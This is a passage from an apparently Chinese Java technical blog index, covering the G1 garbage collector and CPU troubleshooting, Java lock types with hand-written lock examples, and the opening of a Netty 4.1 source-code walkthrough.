是一种面向服务端的垃圾收集器，应用在多核处理器和大容量内存环境中，在实现高吞吐量的同时，尽可能的满足垃圾收集器的暂停时间要求。 像 CMS 收集器一样，能与应用程序线程并发执行，整理空闲空间更快，需要更多的时间来预测 GC 停顿时间，不希望牺牲大量的吞吐性能，不需要更大的 JAVA Heap。 G1 收集器的设计目的是取代 CMS 收集器，同时与 CMS 相比，G1 垃圾收集器是一个有整理内存过程的垃圾收集器，不会产生很多内存碎片。G1 的 Stop The World 更可控，G1 在停顿上添加了预测机制，用户可以指定期望的停顿时间。 G1 是在 2012 年才在 jdk.1.7u4 中可以呀用，在 jdk9 中将 G1 变成默认垃圾收集器来代替 CMS。它是以款面向服务应用的收集器。 主要改变是 Eden、Survivor 和 Tenured 等内存区域不再是连续的，而是变成了一个个大小一样的 region，每个 region 从 1M 到 32M 不等，一个 region 有可能属于 Eden、Survivor 或者 Tenured 内存区域。 G1的特点 G1 能充分利用多 CPU、多核环境硬件优势，尽量缩短 STW。 G1 整体采用标记-整理算法，局部是通过是通过复制算法，不会产生内存碎片。 宏观上看 G1 之中不在区分年轻代和老年代，被内存划分为多个独立的子区域。 G1 收集器里面讲整个的内存区域混合在一起，但其本身依然在小范围内要进行年轻代和老年代的区分。保留了新生代和老年代，但她们不在是物理隔离，而是一部分 Region 的集合且不需要 Region 是连续的，也就是说依然会采用不同的 GC 方式来处理不同的区域。 G1 虽然也是分代收集器，但整个内存分区不存在物理上的年轻代和老年代的区别，也不需要完全独立的 Survivor to space 堆做复制准备。G1 只有逻辑上的分代概念，或者说每个分区都可能随 G1 的运行在不同代之间前后切换。 底层原理 Region 区域化垃圾收集器：最大好处是化整为零，避免全内存扫描，只需要按照区域来进行扫描即可。 G1的内存结构和传统的内存空间划分有比较的不同。G1将内存划分成了多个大小相等的Region（默认是512K），Region逻辑上连续，物理内存地址不连续。同时每个Region被标记成E、S、O、H，分别表示Eden、Survivor、Old、Humongous。其中E、S属于年轻代，O与H属于老年代。 H表示Humongous。从字面上就可以理解表示大的对象（下面简称H对象）。当分配的对象大于等于Region大小的一半的时候就会被认为是巨型对象。H对象默认分配在老年代，可以防止GC的时候大对象的内存拷贝。通过如果发现堆内存容不下H对象的时候，会触发一次GC操作。 参看：G1从入门到放弃 生产环境服务器变慢，诊断思路和性能评估谈谈？ 整机：top CPU：vmstat 内存：free 硬盘：df 磁盘IO：iostat 网络IO：ifstat 假如生产环境出现 CPU 过高，请谈谈你的分析思路和定位？ 先用 top 命令找出 CPU 占比最高的 ps -ef 或者 jps 进一步定位，得知是一个怎么样的一个后台程序 定位到具体的线程或代码 ps -mp 11111 -o THREAD,tid,time -m 显示所有的线程 -p 进程使用cpu的时间 -o 该参数后是用户自定义格式 将需要的线程 ID 转化为 16 进制格式 jstat &lt;进程ID&gt; | grep &lt;线程ID(16进制)&gt; -A60 对于 JDK 自带的 JVM 监控和性能分析工具用过哪些？一般机是怎么用到的？下一篇重点介绍。 你有没有JVM调优的经验参考链接 强引用、软引用、弱引用、幻象引用有什么区别？(评论) G1从入门到放弃","link":"/2019/05/10/JVM%E9%9D%A2%E8%AF%95/"},{"title":"Java 中的锁","text":"Java中的锁分类在读很多并发文章中，会提及各种各样锁如公平锁，乐观锁等等，这篇文章介绍各种锁的分类。介绍的内容如下： 公平锁/非公平锁 可重入锁/不可重入锁 独享锁/共享锁 互斥锁/读写锁 乐观锁/悲观锁 分段锁 偏向锁/轻量级锁/重量级锁 自旋锁 上面是很多锁的名词，这些分类并不是全是指锁的状态，有的指锁的特性，有的指锁的设计，下面总结的内容是对每个锁的名词进行一定的解释。 公平锁/非公平锁是什么 公平锁：是指多个线程按照申请的顺序来获取值 非公平锁：是值多个线程获取值的顺序并不是按照申请锁的顺序，有可能后申请的线程比先申请的线程优先获取锁，在高并发的情况下，可能会造成优先级翻转或者饥饿现象 两者区别 公平锁：在并发环境中，每一个线程在获取锁时会先查看此锁维护的等待队列，如果为空，或者当前线程是等待队列的第一个就占有锁，否者就会加入到等待队列中，以后会按照 FIFO 的规则获取锁 非公平锁：一上来就尝试占有锁，如果失败在进行排队 对于 Java ReentrantLock而言，通过构造函数指定该锁是否是公平锁，默认是非公平锁。非公平锁的优点在于吞吐量比公平锁大。 对于Synchronized而言，也是一种非公平锁。由于其并不像ReentrantLock是通过AQS的来实现线程调度，所以并没有任何办法使其变成公平锁。 可重入锁/不可重入锁最近正在阅读Java ReentrantLock源码，始终对可重入和不可重入概念理解不透彻，进行学习后记录在这里。 可重入锁：指的是同一个线程外层函数获得锁之后，内层仍然能获取到该锁，在同一个线程在外层方法获取锁的时候，在进入内层方法或会自动获取该锁 不可重入锁： 所谓不可重入锁，即若当前线程执行某个方法已经获取了该锁，那么在方法中尝试再次获取锁时，就会获取不到被阻塞 Java多线程的 wait() 方法和 notify() 方法。这两个方法是成对出现和使用的，要执行这两个方法，有一个前提就是，当前线程必须获其对象的monitor（俗称“锁”），否则会抛 IllegalMonitorStateException 异常，所以这两个方法必须在同步块代码里面调用。wait()：阻塞当前线程， notify()：唤起被wait()阻塞的线程。 手动实现一个可重入锁 public class ReentrantLock { boolean isLocked = false; Thread lockedBy = null; int lockedCount = 0; public synchronized void lock() throws InterruptedException { Thread thread = Thread.currentThread(); while (isLocked &amp;&amp; lockedBy != thread) { wait(); } isLocked = true; lockedCount++; lockedBy = thread; } public synchronized void unlock() { if (Thread.currentThread() == lockedBy) { lockedCount--; if (lockedCount == 0) { isLocked = false; notify(); } } }} 发现可以输出 ReentrantLock，我们设计两个线程调用 print() 方法，第一个线程调用 print() 方法获取锁，进入 lock() 方法，由于初始 lockedBy 是 null，所以不会进入 while 而挂起当前线程，而是是增量 lockedCount 并记录 lockBy 为第一个线程。接着第一个线程进入 doAdd() 方法，由于同一进程，所以不会进入 while 而挂起，接着增量 lockedCount，当第二个线程尝试lock，由于 isLocked=true，所以他不会获取该锁，直到第一个线程调用两次 unlock() 将 lockCount 递减为0，才将标记为 isLocked 设置为 false。 public class Count {// NotReentrantLock lock = new NotReentrantLock(); ReentrantLock lock = new ReentrantLock(); public void print() throws InterruptedException{ lock.lock(); doAdd(); lock.unlock(); } private void doAdd() throws InterruptedException { lock.lock(); // do something System.out.println(&quot;ReentrantLock&quot;); lock.unlock(); } public static void main(String[] args) throws InterruptedException { Count count = new Count(); count.print(); }} 手动实现一个不可重入锁 public class NotReentrantLock { private boolean isLocked = false; public synchronized void lock() throws InterruptedException { while (isLocked) { wait(); } isLocked = true; } public synchronized void unlock() { isLocked = false; notify(); }} 测试 public class Count { NotReentrantLock lock = new NotReentrantLock(); public void print() throws InterruptedException{ lock.lock(); doAdd(); lock.unlock(); } private void doAdd() throws InterruptedException { lock.lock(); // do something lock.unlock(); } public static void main(String[] args) throws InterruptedException { Count count = new Count(); count.print(); }} 当前线程执行print()方法首先获取lock，接下来执行doAdd()方法就无法执行doAdd()中的逻辑，必须先释放锁。这个例子很好的说明了不可重入锁。 synchronized 和 ReentrantLock 都是可重入锁 synchronzied public class SynchronziedDemo { private synchronized void print() { doAdd(); } private synchronized void doAdd() { System.out.println(&quot;doAdd...&quot;); } public static void main(String[] args) { SynchronziedDemo synchronziedDemo = new SynchronziedDemo(); synchronziedDemo.print(); // doAdd... }} 上面可以说明 synchronized 是可重入锁。 ReentrantLock public class ReentrantLockDemo { private Lock lock = new ReentrantLock(); private void print() { lock.lock(); doAdd(); lock.unlock(); } private void doAdd() { lock.lock(); lock.lock(); System.out.println(&quot;doAdd...&quot;); lock.unlock(); lock.unlock(); } public static void main(String[] args) { ReentrantLockDemo reentrantLockDemo = new ReentrantLockDemo(); reentrantLockDemo.print(); }} 上面例子可以说明 ReentrantLock 是可重入锁，而且在 #doAdd 方法中加两次锁和解两次锁也可以。 可重入锁的概念和设计思想大体如此，Java 中的可重入锁 ReentrantLock 设计思路也是这样。 独享锁/共享锁是什么 独享锁是指该锁一次只能被一个线程所持有。 共享锁是指该锁可被多个线程所持有。 对于Java ReentrantLock而言，其是独享锁。但是对于Lock的另一个实现类ReadWriteLock，其读锁是共享锁，其写锁是独享锁。 读锁的共享锁可保证并发读是非常高效的，读写，写读 ，写写的过程是互斥的。 独享锁与共享锁也是通过AQS来实现的，通过实现不同的方法，来实现独享或者共享。 对于Synchronized而言，当然是独享锁。 读写锁例子 public class MyCache { private volatile Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); private ReentrantReadWriteLock lock = new ReentrantReadWriteLock(); WriteLock writeLock = lock.writeLock(); ReadLock readLock = lock.readLock(); public void put(String key, Object value) { try { writeLock.lock(); System.out.println(Thread.currentThread().getName() + &quot; 正在写入...&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } map.put(key, value); System.out.println(Thread.currentThread().getName() + &quot; 写入完成，写入结果是 &quot; + value); } finally { writeLock.unlock(); } } public void get(String key) { try { readLock.lock(); System.out.println(Thread.currentThread().getName() + &quot; 正在读...&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Object res = map.get(key); System.out.println(Thread.currentThread().getName() + &quot; 读取完成，读取结果是 &quot; + res); } finally { readLock.unlock(); } }} 测试 public class ReadWriteLockDemo { public static void main(String[] args) { MyCache cache = new MyCache(); for (int i = 0; i &lt; 5; i++) { final int temp = i; new Thread(() -&gt; { cache.put(temp + &quot;&quot;, temp + &quot;&quot;); }).start(); } for (int i = 0; i &lt; 5; i++) { final int temp = i; new Thread(() -&gt; { cache.get(temp + &quot;&quot;); }).start(); } }} 输出结果 Thread-0 正在写入...Thread-0 写入完成，写入结果是 0Thread-1 正在写入...Thread-1 写入完成，写入结果是 1Thread-2 正在写入...Thread-2 写入完成，写入结果是 2Thread-3 正在写入...Thread-3 写入完成，写入结果是 3Thread-4 正在写入...Thread-4 写入完成，写入结果是 4Thread-5 正在读...Thread-7 正在读...Thread-8 正在读...Thread-6 正在读...Thread-9 正在读...Thread-5 读取完成，读取结果是 0Thread-7 读取完成，读取结果是 2Thread-8 读取完成，读取结果是 3Thread-6 读取完成，读取结果是 1Thread-9 读取完成，读取结果是 4 能保证读写、写读和写写的过程是互斥的时候是独享的，读读的时候是共享的。 互斥锁/读写锁上面讲的独享锁/共享锁就是一种广义的说法，互斥锁/读写锁就是具体的实现。 互斥锁在Java中的具体实现就是ReentrantLock 读写锁在Java中的具体实现就是ReadWriteLock 乐观锁/悲观锁乐观锁与悲观锁不是指具体的什么类型的锁，而是指看待并发同步的角度。 悲观锁认为对于同一个数据的并发操作，一定是会发生修改的，哪怕没有修改，也会认为修改。因此对于同一个数据的并发操作，悲观锁采取加锁的形式。悲观的认为，不加锁的并发操作一定会出问题。 乐观锁则认为对于同一个数据的并发操作，是不会发生修改的。在更新数据的时候，会采用尝试更新，不断重新的方式更新数据。乐观的认为，不加锁的并发操作是没有事情的。 从上面的描述我们可以看出，悲观锁适合写操作非常多的场景，乐观锁适合读操作非常多的场景，不加锁会带来大量的性能提升。 悲观锁在Java中的使用，就是利用各种锁。 乐观锁在Java中的使用，是无锁编程，常常采用的是CAS算法，典型的例子就是原子类，通过CAS自旋实现原子操作的更新。 分段锁分段锁其实是一种锁的设计，并不是具体的一种锁，对于ConcurrentHashMap 而言，其并发的实现就是通过分段锁的形式来实现高效的并发操作。 我们以ConcurrentHashMap来说一下分段锁的含义以及设计思想，ConcurrentHashMap中的分段锁称为Segment，它即类似于HashMap（JDK7与JDK8中HashMap的实现）的结构，即内部拥有一个Entry数组，数组中的每个元素又是一个链表；同时又是一个ReentrantLock（Segment继承了ReentrantLock)。 当需要put元素的时候，并不是对整个hashmap进行加锁，而是先通过 hashcode 来知道他要放在那一个分段中，然后对这个分段进行加锁，所以当多线程put的时候，只要不是放在一个分段中，就实现了真正的并行的插入。 但是，在统计size的时候，可就是获取 hashmap 全局信息的时候，就需要获取所有的分段锁才能统计。 分段锁的设计目的是细化锁的粒度，当操作不需要更新整个数组的时候，就仅仅针对数组中的一项进行加锁操作。 偏向锁/轻量级锁/重量级锁偏向锁 在没有实际竞争的情况下，还能够针对部分场景继续优化。如果不仅仅没有实际竞争，自始至终，使用锁的线程都只有一个，那么，维护轻量级锁都是浪费的。偏向锁的目标是，减少无竞争且只有一个线程使用锁的情况下，使用轻量级锁产生的性能消耗。轻量级锁每次申请、释放锁都至少需要一次CAS，但偏向锁只有初始化时需要一次CAS。 “偏向”的意思是，偏向锁假定将来只有第一个申请锁的线程会使用锁（不会有任何线程再来申请锁），因此，只需要在Mark Word中 CAS 记录owner（本质上也是更新，但初始值为空），如果记录成功，则偏向锁获取成功，记录锁状态为偏向锁，以后当前线程等于owner就可以零成本的直接获得锁；否则，说明有其他线程竞争，膨胀为轻量级锁。 偏向锁无法使用自旋锁优化，因为一旦有其他线程申请锁，就破坏了偏向锁的假定。 缺点： 同样的，如果明显存在其他线程申请锁，那么偏向锁将很快膨胀为轻量级锁。 不过这个副作用已经小的多。 如果需要，使用参数-XX:-UseBiasedLocking禁止偏向锁优化（默认打开）。 轻量级锁 自旋锁的目标是降低线程切换的成本。如果锁竞争激烈，我们不得不依赖于重量级锁，让竞争失败的线程阻塞；如果完全没有实际的锁竞争，那么申请重量级锁都是浪费的。轻量级锁的目标是，减少无实际竞争情况下，使用重量级锁产生的性能消耗，包括系统调用引起的内核态与用户态切换、线程阻塞造成的线程切换等。 顾名思义，轻量级锁是相对于重量级锁而言的。使用轻量级锁时，不需要申请互斥量，仅仅将 Mark Word 中的部分字节CAS更新指向线程栈中的Lock Record，如果更新成功，则轻量级锁获取成功，记录锁状态为轻量级锁；否则，说明已经有线程获得了轻量级锁，目前发生了锁竞争（不适合继续使用轻量级锁），接下来膨胀为重量级锁。 Mark Word是对象头的一部分；每个线程都拥有自己的线程栈（虚拟机栈），记录线程和函数调用的基本信息。二者属于JVM的基础内容，此处不做介绍。 当然，由于轻量级锁天然瞄准不存在锁竞争的场景，如果存在锁竞争但不激烈，仍然可以用自旋锁优化，自旋失败后再膨胀为重量级锁。 重量级锁 内置锁在Java中被抽象为监视器锁（monitor）。在JDK 1.6之前，监视器锁可以认为直接对应底层操作系统中的互斥量（mutex）。这种同步方式的成本非常高，包括系统调用引起的内核态与用户态切换、线程阻塞造成的线程切换等。因此，后来称这种锁为“重量级锁”。 偏向锁、轻量级锁、重量级锁分配和膨胀的详细过程见后。会涉及一些Mark Word与CAS的知识。 偏向锁、轻量级锁、重量级锁适用于不同的并发场景： 偏向锁：无实际竞争，且将来只有第一个申请锁的线程会使用锁。 轻量级锁：无实际竞争，多个线程交替使用锁；允许短时间的锁竞争。 重量级锁：有实际竞争，且锁竞争时间长。 另外，如果锁竞争时间短，可以使用自旋锁进一步优化轻量级锁、重量级锁的性能，减少线程切换。 如果锁竞争程度逐渐提高（缓慢），那么从偏向锁逐步膨胀到重量锁，能够提高系统的整体性能。 自旋锁首先，内核态与用户态的切换上不容易优化。但通过自旋锁，可以减少线程阻塞造成的线程切换（包括挂起线程和恢复线程）。 如果锁的粒度小，那么锁的持有时间比较短（尽管具体的持有时间无法得知，但可以认为，通常有一部分锁能满足上述性质）。那么，对于竞争这些锁的而言，因为锁阻塞造成线程切换的时间与锁持有的时间相当，减少线程阻塞造成的线程切换，能得到较大的性能提升。具体如下： 当前线程竞争锁失败时，打算阻塞自己 不直接阻塞自己，而是自旋（空等待，比如一个空的有限for循环）一会 在自旋的同时重新竞争锁 如果自旋结束前获得了锁，那么锁获取成功；否则，自旋结束后阻塞自己 如果在自旋的时间内，锁就被旧owner释放了，那么当前线程就不需要阻塞自己（也不需要在未来锁释放时恢复），减少了一次线程切换。 “锁的持有时间比较短“这一条件可以放宽。实际上，只要锁竞争的时间比较短（比如线程1快释放锁的时候，线程2才会来竞争锁），就能够提高自旋获得锁的概率。这通常发生在锁持有时间长，但竞争不激烈的场景中。 手动实现自旋锁 public class SpinLock { private AtomicReference&lt;Thread&gt; atomicReference = new AtomicReference&lt;&gt;(); private void lock () { System.out.println(Thread.currentThread() + &quot; coming...&quot;); while (!atomicReference.compareAndSet(null, Thread.currentThread())) { // loop } } private void unlock() { Thread thread = Thread.currentThread(); atomicReference.compareAndSet(thread, null); System.out.println(thread + &quot; unlock...&quot;); } public static void main(String[] args) throws InterruptedException { SpinLock spinLock = new SpinLock(); new Thread(() -&gt; { spinLock.lock(); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;hahaha&quot;); spinLock.unlock(); }).start(); Thread.sleep(1); new Thread(() -&gt; { spinLock.lock(); System.out.println(&quot;hehehe&quot;); spinLock.unlock(); }).start(); }} 输出： Thread[Thread-0,5,main] coming...Thread[Thread-1,5,main] coming...hahahaThread[Thread-0,5,main] unlock...heheheThread[Thread-1,5,main] unlock... 获取锁的时候，如果原子引用为空就获取锁，不为空表示有人获取了锁，就循环等待。 典型的自旋锁实现的例子，可以参考自旋锁的实现 锁分配和膨胀过程 参考链接 Java中的锁分类 Java不可重入锁和可重入锁理解 浅谈偏向锁、轻量级锁、重量级锁","link":"/2019/02/13/Java%E4%B8%AD%E7%9A%84%E9%94%81/"},{"title":"Netty 源码分析（一）","text":"版本 4.1.15 官网：https://netty.io/ Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers &amp; clients. 先看一个例子服务端MyServer 类 /** * @Author: cuzz * @Date: 2019/1/1 19:44 * @Description: */public class MyServer { public static void main(String[] args) throws InterruptedException { EventLoopGroup bossGroup = new NioEventLoopGroup(); EventLoopGroup workGroup = new NioEventLoopGroup(); try { ServerBootstrap bootstrap = new ServerBootstrap(); bootstrap.group(bossGroup, workGroup) .channel(NioServerSocketChannel.class) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new MyServerinitializer()); ChannelFuture channelFuture = bootstrap.bind(8899).sync(); channelFuture.channel().closeFuture().sync(); } finally { bossGroup.shutdownGracefully(); bossGroup.shutdownGracefully(); } }} MyServerinitializer 类 /** * @Author: cuzz * @Date: 2019/1/1 20:06 * @Description: */public class MyServerinitializer extends ChannelInitializer&lt;SocketChannel&gt; { @Override protected void initChannel(SocketChannel ch) throws Exception { ChannelPipeline pipeline = ch.pipeline(); pipeline.addLast(new LengthFieldBasedFrameDecoder(Integer.MAX_VALUE, 0, 4, 0, 4)); pipeline.addLast(new LengthFieldPrepender(4)); pipeline.addLast(new StringDecoder(CharsetUtil.UTF_8)); pipeline.addLast(new StringEncoder(CharsetUtil.UTF_8)); pipeline.addLast(new MyServerHandler()); }} MyServerHandler 类 /** * @Author: cuzz * @Date: 2019/1/1 20:23 * @Description: */public class MyServerHandler extends SimpleChannelInboundHandler&lt;String&gt;{ @Override protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception { System.out.println(ctx.channel().remoteAddress() + &quot;: &quot; + msg); ctx.channel().writeAndFlush(&quot;from server: &quot; + UUID.randomUUID()); } /** * 出现异常关闭连接 * @param ctx * @param cause * @throws Exception */ @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception { cause.printStackTrace(); ctx.close(); }} 客服端MyClient 类 /** * @Author: cuzz * @Date: 2019/1/1 20:31 * @Description: */public class MyClient { public static void main(String[] args) throws Exception { EventLoopGroup eventLoopGroup = new NioEventLoopGroup(); try { Bootstrap bootstrap = new Bootstrap(); bootstrap.group(eventLoopGroup) .channel(NioSocketChannel.class) .handler(new MyClientInitializer()); ChannelFuture channelFuture = bootstrap.connect(&quot;localhost&quot;,8899).sync(); channelFuture.channel().closeFuture().sync(); } finally { eventLoopGroup.shutdownGracefully(); } }} MyClientInitializer 类 /** * @Author: cuzz * @Date: 2019/1/1 20:40 * @Description: */public class MyClientInitializer extends ChannelInitializer&lt;SocketChannel&gt;{ @Override protected void initChannel(SocketChannel ch) throws Exception { ChannelPipeline pipeline = ch.pipeline(); pipeline.addLast(new LengthFieldBasedFrameDecoder(Integer.MAX_VALUE, 0, 4, 0, 4)); pipeline.addLast(new LengthFieldPrepender(4)); pipeline.addLast(new StringDecoder(CharsetUtil.UTF_8)); pipeline.addLast(new StringEncoder(CharsetUtil.UTF_8)); pipeline.addLast(new MyClientHandler()); }} MyClientHandler 类 /** * @Author: cuzz * @Date: 2019/1/1 20:42 * @Description: */public class MyClientHandler extends SimpleChannelInboundHandler&lt;String&gt;{ @Override protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception { System.out.println(ctx.channel().remoteAddress() + &quot;: &quot; + msg); ctx.writeAndFlush(&quot;from clinet: &quot; + UUID.randomUUID()); } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception { cause.printStackTrace(); ctx.close(); } @Override public void channelActive(ChannelHandlerContext ctx) throws Exception { ctx.writeAndFlush(&quot;来自客户端的连接！！！&quot;); }} 初始化EventLoopGroup创建一个 bossGroup 和 workGroup EventLoopGroup bossGroup = new NioEventLoopGroup();EventLoopGroup workGroup = new NioEventLoopGroup(); EventLoopGroup 翻译过来叫事件循环组，其本身就是一个死循环 bossGroup 是把接受连接，把连接转发给 workGroup ，workGroup 是真正完成用户请求处理的类 EventLoopGroup 是一个接口，在后面循环的过程中可以选择把 Channel 注册上 /** * Special {@link EventExecutorGroup} which allows registering {@link Channel}s that get * processed for later selection during the event loop. * */public interface EventLoopGroup extends EventExecutorGroup { @Override EventLoop next(); ChannelFuture register(Channel channel); ChannelFuture register(ChannelPromise promise);} NioEventLoopGroup// 他是一个基于NIO的选择器的对象 public class NioEventLoopGroup extends MultithreadEventLoopGroup { // 0 public NioEventLoopGroup() { this(0); } // 1 public NioEventLoopGroup(int nThreads) { this(nThreads, (Executor) null); } // 2 public NioEventLoopGroup(int nThreads, Executor executor) { this(nThreads, executor, SelectorProvider.provider()); }} MultithreadEventExecutorGroup最终会跳到MultithreadEventExecutorGroup 中的一个构造器中 protected MultithreadEventExecutorGroup(int nThreads, Executor executor, EventExecutorChooserFactory chooserFactory, Object... args) { } // 1 if (executor == null) { executor = new ThreadPerTaskExecutor(newDefaultThreadFactory()); } children = new EventExecutor[nThreads]; for (int i = 0; i &lt; nThreads; i ++) { boolean success = false; try { children[i] = newChild(executor, args); success = true; } catch (Exception e) { // TODO: Think about if this is a good exception type throw new IllegalStateException(&quot;failed to create a child event loop&quot;, e); } finally { if (!success) { for (int j = 0; j &lt; i; j ++) { children[j].shutdownGracefully(); } for (int j = 0; j &lt; i; j ++) { EventExecutor e = children[j]; try { while (!e.isTerminated()) { e.awaitTermination(Integer.MAX_VALUE, TimeUnit.SECONDS); } } catch (InterruptedException interrupted) { // Let the caller handle the interruption. Thread.currentThread().interrupt(); break; } } } } } chooser = chooserFactory.newChooser(children); final FutureListener&lt;Object&gt; terminationListener = new FutureListener&lt;Object&gt;() { @Override public void operationComplete(Future&lt;Object&gt; future) throws Exception { if (terminatedChildren.incrementAndGet() == children.length) { terminationFuture.setSuccess(null); } } }; for (EventExecutor e: children) { e.terminationFuture().addListener(terminationListener); } Set&lt;EventExecutor&gt; childrenSet = new LinkedHashSet&lt;EventExecutor&gt;(children.length); Collections.addAll(childrenSet, children); readonlyChildren = Collections.unmodifiableSet(childrenSet); } ThreadPerTaskExecutor代码1中，executor = new ThreadPerTaskExecutor(newDefaultThreadFactory());，跟进去 public final class ThreadPerTaskExecutor implements Executor { private final ThreadFactory threadFactory; public ThreadPerTaskExecutor(ThreadFactory threadFactory) { if (threadFactory == null) { throw new NullPointerException(&quot;threadFactory&quot;); } this.threadFactory = threadFactory; } @Override public void execute(Runnable command) { threadFactory.newThread(command).start(); }} 这里用到了工厂方法和命令模式，通过传入一个command调用工厂方法 Executorpublic interface Executor { /** * Executes the given command at some time in the future. The command * may execute in a new thread, in a pooled thread, or in the calling * thread, at the discretion of the {@code Executor} implementation. * * @param command the runnable task * @throws RejectedExecutionException if this task cannot be * accepted for execution * @throws NullPointerException if command is null */ void execute(Runnable command);} 这是在java.util.concurrent 下的一个接口，最主要的实现方式把一个task传入，新建一个线程运行 class ThreadPerTaskExecutor implements Executor { public void execute(Runnable r) { new Thread(r).start(); }} 也可以通过一系列的限制，比如序列化等一下操作 class SerialExecutor implements Executor { final Queue&lt;Runnable&gt; tasks = new ArrayDeque&lt;Runnable&gt;(); final Executor executor; Runnable active; SerialExecutor(Executor executor) { this.executor = executor; } public synchronized void execute(final Runnable r) { tasks.offer(new Runnable() { public void run() { try { r.run(); } finally { scheduleNext(); } } }); if (active == null) { scheduleNext(); } } protected synchronized void scheduleNext() { if ((active = tasks.poll()) != null) { executor.execute(active); } }} 其中非常常用用的几个实现如：ExecutorService，ThreadPoolExecutor 下面是官方文档 The Executor implementations provided in this package implement ExecutorService, which is a more extensive interface. The ThreadPoolExecutor class provides an extensible thread pool implementation. The Executors class provides convenient factory methods for these Executors.The Executor implementations provided in this package implement ExecutorService, which is a more extensive interface. The ThreadPoolExecutor class provides an extensible thread pool implementation. The Executors class provides convenient factory methods for these Executors. 回顾一下 MyServer 中启动的代码 try { ServerBootstrap bootstrap = new ServerBootstrap(); bootstrap.group(bossGroup, workGroup) .channel(NioServerSocketChannel.class) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new MyServerinitializer()); ChannelFuture channelFuture = bootstrap.bind(8899).sync(); channelFuture.channel().closeFuture().sync();} finally { bossGroup.shutdownGracefully(); bossGroup.shutdownGracefully();} ServerBootstrappublic class ServerBootstrap extends AbstractBootstrap&lt;ServerBootstrap, ServerChannel&gt; { ... } ServerBootstrap 是 Bootstrap子类，容易的地启动一个 ServerChannel ServerChannel接受一个即将到来的连接，创建子 Channel /** * A {@link Channel} that accepts an incoming connection attempt and creates * its child {@link Channel}s by accepting them. {@link ServerSocketChannel} is * a good example. */public interface ServerChannel extends Channel { // This is a tag interface.} 其有很多实现的子类，其中 NioServerSocketChannel 是我们比较关注的 方法链bootstrap.group(bossGroup, workGroup) .channel(NioServerSocketChannel.class) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new MyServerinitializer()); .group(bossGroup, workGroup) 我们把 bossGroup 和 workGroup 传入进去，由于是方法链，肯定返回本身，跟踪下去 /** * Set the {@link EventLoopGroup} for the parent (acceptor) and the child (client). These * {@link EventLoopGroup}'s are used to handle all the events and IO for {@link ServerChannel} and * {@link Channel}'s. */public ServerBootstrap group(EventLoopGroup parentGroup, EventLoopGroup childGroup) { super.group(parentGroup); if (childGroup == null) { throw new NullPointerException(&quot;childGroup&quot;); } if (this.childGroup != null) { throw new IllegalStateException(&quot;childGroup set already&quot;); } this.childGroup = childGroup; return this;} 这个步，就是给 bossGroup 和 workGroup 赋值给 ServerBootstrap 的实例 .channel(NioServerSocketChannel.class) 方法，接受的是一个 class 对象，一般接受 class 对象大多数与反射有关系 /** * The {@link Class} which is used to create {@link Channel} instances from. * You either use this or {@link #channelFactory(io.netty.channel.ChannelFactory)} if your * {@link Channel} implementation has no no-args constructor. */public B channel(Class&lt;? extends C&gt; channelClass) { if (channelClass == null) { throw new NullPointerException(&quot;channelClass&quot;); } return channelFactory(new ReflectiveChannelFactory&lt;C&gt;(channelClass));} 进入 channelFactory 方法 /** * {@link io.netty.channel.ChannelFactory} which is used to create {@link Channel} instances from * when calling {@link #bind()}. This method is usually only used if {@link #channel(Class)} * is not working for you because of some more complex needs. If your {@link Channel} implementation * has a no-args constructor, its highly recommend to just use {@link #channel(Class)} for * simplify your code. */@SuppressWarnings({ &quot;unchecked&quot;, &quot;deprecation&quot; })public B channelFactory(io.netty.channel.ChannelFactory&lt;? extends C&gt; channelFactory) { return channelFactory((ChannelFactory&lt;C&gt;) channelFactory);} 如果有无参数的构造方法推荐使用，这样可以简化代码 Q：为什么必须要有无参数构造方法呢？ A : 一般来说，获取一个实例如下生成，所以必须有无参数构造方法 Class class = Class.forName(className);Object object = class.newInstance(); // 只能调用无参构造函数 我们在来看看 NioServerSocketChannel A {@link io.netty.channel.socket.ServerSocketChannel} implementation which uses NIO selector based implementation to accept new connections. .childHandler(new MyServerinitializer()); 设置用于请求的 Handler /** * Set the {@link ChannelHandler} which is used to serve the request for the {@link Channel}'s. */public ServerBootstrap childHandler(ChannelHandler childHandler) { if (childHandler == null) { throw new NullPointerException(&quot;childHandler&quot;); } this.childHandler = childHandler; return this;} 这里其实有 handler 和 childHandler 一个是给 bossGroup 使用的，一个是给 workGroup 使用的 启动ChannelFuture channelFuture = bootstrap.bind(8899).sync(); ChannelFutureChannelFuture 先是继承了自己提供的 Future ，自身的 Future 又继承 java.util.concurrent.Future&lt;V&gt; ，我们先看看 JUC 中 Future 和 FutureTask JUC.Future看看其中几个主要的方法，从方法名也知道是做什么的 public interface Future&lt;V&gt; { boolean cancel(boolean mayInterruptIfRunning); boolean isCancelled(); boolean isDone(); V get() throws InterruptedException, ExecutionException; V get(long timeout, TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException;} 文档： A Future represents the result of an asynchronous computation. Methods are provided to check if the computation is complete, to wait for its completion, and to retrieve the result of the computation. The result can only be retrieved using method get when the computation has completed, blocking if necessary until it is ready. Cancellation is performed by the cancel method. Additional methods are provided to determine if the task completed normally or was cancelled. Once a computation has completed, the computation cannot be cancelled. If you would like to use a Future for the sake of cancellability but not provide a usable result, you can declare types of the form Future&lt;?&gt; and return null as a result of the underlying task. 使用： interface ArchiveSearcher { String search(String target); }class App { ExecutorService executor = ... ArchiveSearcher searcher = ... void showSearch(final String target) throws InterruptedException { Future&lt;String&gt; future = executor.submit(new Callable&lt;String&gt;() { public String call() { return searcher.search(target); } }); displayOtherThings(); // do other things while searching try { displayText(future.get()); // use future } catch (ExecutionException ex) { cleanup(); return; } }} JUC.FutureTask The FutureTask class is an implementation of Future that implements Runnable, and so may be executed by an Executor. For example, the above construction with submit could be replaced by: FutureTask&lt;String&gt; future = new FutureTask&lt;String&gt;(new Callable&lt;String&gt;() { public String call() { return 